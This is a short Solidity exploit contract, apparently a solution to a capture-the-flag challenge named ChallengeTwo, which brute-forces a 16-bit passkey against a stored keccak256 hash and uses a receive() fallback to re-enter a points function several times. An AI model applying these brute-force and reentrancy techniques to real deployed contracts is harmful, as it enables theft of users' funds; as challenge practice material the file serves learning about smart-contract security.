// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import "../src/Challenge2.sol";

contract Exploit{
    function passkey(address c) public{
        for(uint16 i; i <= type(uint16).max; ++i){
            if(

            keccak256(abi.encode(i)) ==
                0xd8a1c3b3a94284f14146eb77d9b0decfe294c3ba72a437151caae86c3c8b2070
            ){
                ChallengeTwo(c).passKey(i);
                console2.log("key found", i);
                break;
            }
        }
    }

    function point(address c) external {
        ChallengeTwo(c).getENoughPoint("Angella");
    }

    function add(address c) external {
        ChallengeTwo(c).addYourName();
    }
    uint count;
    receive() external payable {
            if(count != 3){
                count++;
                ChallengeTwo(msg.sender).getENoughPoint("Angella");
            }

    }
}